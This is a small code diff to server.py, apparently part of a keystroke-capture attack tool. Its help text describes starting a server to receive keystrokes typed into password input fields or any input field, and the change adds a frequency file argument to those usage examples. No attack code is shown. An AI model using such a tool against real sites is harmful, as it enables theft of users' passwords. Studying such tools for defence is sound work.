@@ -5,9 +5,9 @@ from itertools import product
 import argparse, logging, math, urllib.parse, re, os, json
 
 description = '''Start server to receive key strokes inside password input fields:
-\tpython3 server.py -e input -a value -t password
+\tpython3 server.py freq_en.json -e input -a value -t password
 Start server to receive key strokes inside any input field:
-\tpython3 server.py -e input -a value'''
+\tpython3 server.py freq_en.json -e input -a value'''
 
 # Initialize argument parsing
 class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
